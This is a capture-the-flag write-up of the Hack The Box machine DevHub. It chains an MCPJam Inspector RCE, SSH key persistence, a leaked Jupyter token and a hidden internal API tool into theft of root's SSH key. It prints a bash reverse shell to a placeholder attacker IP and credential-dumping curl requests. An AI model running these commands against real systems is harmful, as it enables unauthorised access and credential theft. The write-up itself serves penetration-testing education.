# Hack The Box — DevHub

> **Platform:** Hack The Box  
> **Target:** DevHub  
> **OS:** Linux  
> **Difficulty:** Medium  
> **Focus:** Web enumeration, MCPJam Inspector, CVE-2026-23744, SSH key persistence, localhost service enumeration, SSH port forwarding, JupyterLab, process enumeration, Python code execution, internal API abuse, SSH key-based privilege escalation

---

## Table of Contents

- [1. Overview](#1-overview)
- [2. Initial Enumeration](#2-initial-enumeration)
- [3. MCPJam Inspector Enumeration](#3-mcpjam-inspector-enumeration)
- [4. Initial Access via CVE-2026-23744](#4-initial-access-via-cve-2026-23744)
- [5. Establishing a Stable SSH Session](#5-establishing-a-stable-ssh-session)
- [6. Local Service Enumeration](#6-local-service-enumeration)
- [7. Accessing JupyterLab](#7-accessing-jupyterlab)
- [8. Discovering the Jupyter Token](#8-discovering-the-jupyter-token)
- [9. Code Execution as analyst](#9-code-execution-as-analyst)
- [10. Reverse Shell as analyst](#10-reverse-shell-as-analyst)
- [11. Enumerating the OpsMCP API](#11-enumerating-the-opsmcp-api)
- [12. Abusing the Hidden Administrative Tool](#12-abusing-the-hidden-administrative-tool)
- [13. Extracting the Root SSH Key](#13-extracting-the-root-ssh-key)
- [14. Root Access](#14-root-access)
- [15. Attack Chain](#15-attack-chain)
- [16. Key Takeaways](#16-key-takeaways)
- [17. Command Reference](#17-command-reference)

---

# 1. Overview

DevHub is a Linux machine where the compromise is based on chaining together an exposed development interface, a localhost-only JupyterLab instance, and a poorly secured internal API.

The attack path was:

```text
Port Enumeration
        ↓
MCPJam Inspector on 6274
        ↓
MCPJam Inspector v1.4.2
        ↓
CVE-2026-23744
        ↓
RCE as mcp-dev
        ↓
SSH key persistence
        ↓
Local service enumeration
        ↓
JupyterLab on 127.0.0.1:8888
        ↓
SSH port forwarding
        ↓
Jupyter token exposed in process arguments
        ↓
Python execution as analyst
        ↓
Reverse shell as analyst
        ↓
/opt/opsmcp/server.py
        ↓
Hardcoded API key
        ↓
Hidden ops._admin_dump tool
        ↓
/root/.ssh/id_rsa disclosure
        ↓
SSH as root
```

The interesting part of the machine was not a single vulnerability, but the way several small security issues could be chained together. The initial foothold exposed internal services, the internal services exposed a second user, and the second user could abuse an administrative API to recover the root SSH private key.

---

# 2. Initial Enumeration

I started with a full TCP port scan against the target:

```bash
nmap -p- --open 10.129.91.238
```

The relevant services were:

```text
22/tcp    open    ssh
80/tcp    open    http
6274/tcp  open    http
```

I then performed service and version detection on the discovered ports:

```bash
nmap -sCV -p22,80,6274 10.129.91.238
```

The standard SSH service on port `22` did not provide an obvious initial access path.

Port `80` exposed a web dashboard containing references to an MCP Inspector, an analytics dashboard and a code repository. The unusual HTTP service on port `6274` therefore became the main focus.

---

# 3. MCPJam Inspector Enumeration

I accessed the service on port `6274`:

```text
http://10.129.91.238:6274
```

The page identified itself as:

```text
MCPJam Inspector
```

The application settings revealed the version:

```text
MCPJam Inspector v1.4.2
```

This version was associated with:

```text
CVE-2026-23744
```

which allowed remote code execution.

At this point, the exposed MCPJam Inspector instance was much more interesting than the normal HTTP service because it provided a direct route from unauthenticated web access to command execution.

---

# 4. Initial Access via CVE-2026-23744

I exploited the vulnerable MCPJam Inspector instance using the appropriate exploit for:

```text
CVE-2026-23744
```

The resulting command execution provided a shell as:

```text
mcp-dev
```

The first foothold was therefore:

```text
mcp-dev@devhub
```

Although the initial command-execution channel was enough to run commands, I wanted a stable SSH session before continuing with local enumeration.

---

# 5. Establishing a Stable SSH Session

I added my SSH public key to the `mcp-dev` account.

On the target:

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

### What do these commands do?

| Command | Purpose |
|---|---|
| `mkdir -p ~/.ssh` | Create the SSH configuration directory if it does not exist. |
| `chmod 700 ~/.ssh` | Restrict access to the directory. |
| `echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys` | Add the attacker's public key to the account. |
| `chmod 600 ~/.ssh/authorized_keys` | Apply the expected permissions to the authorized keys file. |

I could then reconnect using the corresponding private key:

```bash
ssh -i ~/.ssh/id_rsa mcp-dev@10.129.91.238
```

This converted the initial RCE into a persistent and much more convenient SSH foothold.

---

# 6. Local Service Enumeration

Once I had a stable shell as `mcp-dev`, I enumerated the listening services:

```bash
ss -tulpn
```

The most interesting entries were the localhost-only services:

```text
127.0.0.1:5000
127.0.0.1:8888
```

The external Nmap scan could not access these services because they were bound to the loopback interface.

The web application had already mentioned an internal analytics dashboard, making port `8888` worth investigating. Port `5000` was also interesting because it exposed an internal API that would become important later.

---

# 7. Accessing JupyterLab

JupyterLab was listening only on `127.0.0.1:8888`, so I used SSH local port forwarding from the attacker machine.

```bash
ssh -i ~/.ssh/id_rsa \
  -L 8888:127.0.0.1:8888 \
  -L 5000:127.0.0.1:5000 \
  mcp-dev@10.129.91.238
```

### What does `-L` do?

The syntax is:

```text
-L LOCAL_PORT:DESTINATION:DESTINATION_PORT
```

In this case:

```text
127.0.0.1:8888  →  DevHub 127.0.0.1:8888
127.0.0.1:5000  →  DevHub 127.0.0.1:5000
```

This allowed the internal services to be accessed locally from the attacker machine.

I then opened JupyterLab in Firefox:

```text
http://127.0.0.1:8888
```

Jupyter required an authentication token before allowing access.

---

# 8. Discovering the Jupyter Token

Instead of attempting to guess the Jupyter token, I inspected the running processes on the target:

```bash
ps aux | grep jupyter
```

The Jupyter process exposed the token directly as a command-line argument:

```text
jupyter-lab
--ip=127.0.0.1
--port=8888
--no-browser
--notebook-dir=/home/analyst/notebooks
--ServerApp.token=<TOKEN>
--ServerApp.password=
```

This was enough to authenticate to JupyterLab.

The token could also be verified against the Jupyter API:

```bash
curl -s \
  -H "Authorization: token <TOKEN>" \
  http://127.0.0.1:8888/api
```

The API returned a successful Jupyter response, confirming that the token was valid.

The contents API also exposed a notebook under the `analyst` environment, confirming that Jupyter was running as a different local user:

```text
quarterly_analysis.ipynb
```

---

# 9. Code Execution as analyst

I created a Python 3 notebook in JupyterLab and tested the execution context with:

```python
import os
os.system("whoami")
```

The output was:

```text
analyst
```

The additional `0` shown by Jupyter was only the return value of `os.system()`.

This confirmed arbitrary Python code execution as:

```text
analyst
```

At this point, the attack had progressed from:

```text
mcp-dev
```

to:

```text
analyst
```

through a localhost-only Jupyter service.

---

# 10. Reverse Shell as analyst

To obtain a normal interactive shell, I used a reverse shell from the Jupyter notebook.

On the attacker machine:

```bash
nc -lvnp 4444
```

In the Jupyter notebook:

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'")
```

The callback provided a shell as:

```text
analyst
```

I could now perform local enumeration directly from the `analyst` account.

---

# 11. Enumerating the OpsMCP API

The internal API service was listening on port `5000`. From the `analyst` shell, I inspected the application source:

```bash
grep -nE 'VALID_API_KEY|admin_dump|tools/call' /opt/opsmcp/server.py
```

The output revealed a hardcoded API key:

```python
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"
```

It also revealed a hidden administrative tool:

```python
"ops._admin_dump": {
    "description": "Emergency credential dump - INTERNAL ONLY",
    "parameters": {"target": "string", "confirm": "boolean"}
}
```

The source explicitly indicated that hidden tools were not shown by the normal tool-listing endpoint, but they were still callable.

I then inspected the implementation of the hidden tool:

```bash
sed -n '30,50p;130,160p' /opt/opsmcp/server.py
```

The relevant logic required:

```text
target = ssh_keys
confirm = true
```

If those values were supplied, the application read:

```text
/root/.ssh/id_rsa
```

and returned the private key in its JSON response.

---

# 12. Abusing the Hidden Administrative Tool

The API endpoint used to invoke tools was:

```text
POST /tools/call
```

I called the hidden administrative tool with the discovered API key:

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

The response contained a field named:

```text
root_private_key
```

This meant the internal API could be abused to disclose the SSH private key belonging to `root`.

The vulnerability chain at this point was:

```text
Hardcoded API key
        ↓
Callable hidden tool
        ↓
Arbitrary credential dump
        ↓
/root/.ssh/id_rsa
```

---

# 13. Extracting the Root SSH Key

I saved the API response on the target:

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}' \
  > /tmp/root.json
```

I then copied the JSON file back to the attacker machine:

```bash
ssh -i ~/.ssh/id_rsa mcp-dev@10.129.91.238 'cat /tmp/root.json' > /tmp/root.json
```

Because `jq` was not available, I used Python to extract the `root_private_key` JSON value:

```bash
python3 -c 'import json; print(json.load(open("/tmp/root.json"))["root_private_key"], end="")' > ~/root_id_rsa
```

### Verify the key format

```bash
head -n 1 ~/root_id_rsa
tail -n 1 ~/root_id_rsa
```

The key should start and end with:

```text
-----BEGIN OPENSSH PRIVATE KEY-----
-----END OPENSSH PRIVATE KEY-----
```

The important detail is that the extracted JSON string must be converted back into real newlines. Saving the literal `\n` escape sequences produces an invalid SSH private key.

I then applied the correct permissions:

```bash
chmod 600 ~/root_id_rsa
```

---

# 14. Root Access

Finally, I authenticated to SSH using the recovered private key:

```bash
ssh -i ~/root_id_rsa -o IdentitiesOnly=yes root@10.129.91.238
```

After connecting, I verified the current user:

```bash
whoami
```

The result was:

```text
root
```

The root flag could then be retrieved with:

```bash
cat /root/root.txt
```

This completed the compromise.

---

# 15. Attack Chain

The complete compromise can be summarized as:

```text
┌──────────────────────────────────────┐
│ 1. Port Enumeration                  │
│    22 / 80 / 6274                    │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 2. MCPJam Inspector                  │
│    v1.4.2 on 6274                    │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 3. CVE-2026-23744                    │
│    Remote Code Execution              │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 4. mcp-dev                           │
│    Stable SSH foothold               │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 5. Local Enumeration                 │
│    127.0.0.1:5000 / :8888            │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 6. SSH Port Forwarding               │
│    JupyterLab + OpsMCP               │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 7. Jupyter Token                     │
│    Exposed in process arguments      │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 8. Python Execution                  │
│    analyst                           │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 9. Reverse Shell                     │
│    analyst                           │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 10. OpsMCP Source Inspection         │
│     API key + hidden tool            │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 11. ops._admin_dump                  │
│     ssh_keys                         │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 12. /root/.ssh/id_rsa                │
│     Private key disclosure           │
└──────────────────┬───────────────────┘
                   │
                   ▼
┌──────────────────────────────────────┐
│ 13. SSH authentication               │
│     root                             │
└──────────────────────────────────────┘
```

---

# 16. Key Takeaways

### 1. Always enumerate unusual ports

The service on port `6274` was the real initial attack surface. Standard ports such as `22` and `80` did not immediately reveal a working path.

A full port scan made it possible to identify the exposed MCPJam Inspector instance.

---

### 2. Exact application versions can provide the exploit path

Identifying:

```text
MCPJam Inspector v1.4.2
```

provided a concrete target for vulnerability research and led to:

```text
CVE-2026-23744
```

---

### 3. Turn unstable RCE into a stable foothold

The initial command execution was converted into SSH access by adding an attacker-controlled public key to:

```text
~/.ssh/authorized_keys
```

This made subsequent enumeration, tunnelling and pivoting much easier.

---

### 4. Localhost services are still attack surface

Both JupyterLab and OpsMCP were bound to `127.0.0.1`.

That did not make them safe. Once SSH access had been obtained, local port forwarding exposed them to the attacker.

---

### 5. Process arguments can expose secrets

The Jupyter token was passed as:

```text
--ServerApp.token=<TOKEN>
```

and was visible through process enumeration.

Sensitive values should not be exposed unnecessarily through process command lines.

---

### 6. Hiding an endpoint is not an authorization control

The administrative tool was excluded from the normal tool listing, but the backend still accepted direct calls to:

```text
ops._admin_dump
```

Security controls must be enforced server-side rather than relying on the endpoint not being advertised.

---

### 7. Hardcoded secrets can become privilege-escalation primitives

The application contained a static API key and an administrative endpoint that returned:

```text
/root/.ssh/id_rsa
```

Together, these weaknesses turned a normal low-privileged application user into a path to full root compromise.

---

# 17. Command Reference

## Port scanning

```bash
nmap -p- --open 10.129.91.238
```

```bash
nmap -sCV -p22,80,6274 10.129.91.238
```

## Local enumeration

```bash
ss -tulpn
```

```bash
ps aux | grep jupyter
```

## SSH persistence

```bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo 'YOUR_PUBLIC_KEY' >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

## SSH port forwarding

```bash
ssh -i ~/.ssh/id_rsa \
  -L 8888:127.0.0.1:8888 \
  -L 5000:127.0.0.1:5000 \
  mcp-dev@10.129.91.238
```

## Jupyter execution

```python
import os
os.system("whoami")
```

## Reverse shell

```bash
nc -lvnp 4444
```

```python
import os
os.system("bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'")
```

## OpsMCP inspection

```bash
grep -nE 'VALID_API_KEY|admin_dump|tools/call' /opt/opsmcp/server.py
```

```bash
sed -n '30,50p;130,160p' /opt/opsmcp/server.py
```

## Hidden tool execution

```bash
curl -s -X POST http://127.0.0.1:5000/tools/call \
  -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" \
  -H "Content-Type: application/json" \
  -d '{"name":"ops._admin_dump","arguments":{"target":"ssh_keys","confirm":true}}'
```

## Extract root key

```bash
python3 -c 'import json; print(json.load(open("/tmp/root.json"))["root_private_key"], end="")' > ~/root_id_rsa
```

```bash
chmod 600 ~/root_id_rsa
```

## Root SSH

```bash
ssh -i ~/root_id_rsa -o IdentitiesOnly=yes root@10.129.91.238
```

---

**The key lesson from DevHub is to keep enumerating after every foothold. A service that is invisible externally can become the most important part of the attack surface once access to the host is obtained.**
